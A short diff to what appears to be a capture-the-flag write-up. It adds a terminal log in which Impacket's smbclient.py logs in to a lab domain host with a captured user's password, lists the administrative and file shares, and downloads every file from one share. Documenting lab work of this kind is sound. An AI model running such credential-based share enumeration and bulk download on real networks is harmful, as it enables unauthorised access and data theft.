@@ -202,6 +202,32 @@ wombleycube                                           2023-12-25 01:13:30.901503
 ```
 ### SMB Enumeration
 ```
-smbclient.py  northpole.local/elfy:J4\`ufC49/J4766@10.0.0.53
+alabaster@ssh-server-vm:~/impacket$ smbclient.py  northpole.local/elfy:J4\`ufC49/J4766@10.0.0.53
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+Type help for list of commands
+# shares
+ADMIN$
+C$
+D$
+FileShare
+IPC$
+NETLOGON
+SYSVOL
+# use FileShare
+# ls
+drw-rw-rw-          0  Mon Dec 25 01:14:25 2023 .
+drw-rw-rw-          0  Mon Dec 25 01:14:22 2023 ..
+-rw-rw-rw-     701028  Mon Dec 25 01:14:25 2023 Cookies.pdf
+-rw-rw-rw-    1521650  Mon Dec 25 01:14:25 2023 Cookies_Recipe.pdf
+-rw-rw-rw-      54096  Mon Dec 25 01:14:25 2023 SignatureCookies.pdf
+drw-rw-rw-          0  Mon Dec 25 01:14:25 2023 super_secret_research
+-rw-rw-rw-        165  Mon Dec 25 01:14:25 2023 todo.txt
+# mget *
+[*] Downloading Cookies.pdf
+[*] Downloading Cookies_Recipe.pdf
+[*] Downloading SignatureCookies.pdf
+[*] Downloading todo.txt
+
 
 ```
